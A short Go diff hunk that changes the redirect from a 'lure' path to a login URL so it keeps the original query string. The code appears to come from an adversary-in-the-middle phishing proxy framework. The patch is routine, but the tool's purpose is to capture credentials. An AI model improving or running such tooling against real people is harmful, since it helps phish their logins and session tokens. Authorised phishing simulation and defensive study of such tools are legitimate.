@@ -579,7 +579,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
 					if err == nil {
 						// redirect from lure path to login url
-						rurl := pl.GetLoginUrl()
+						rurl := pl.GetLoginUrl() + "?" + req.URL.RawQuery
 						u, err := url.Parse(rurl)
 						if err == nil {
 							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
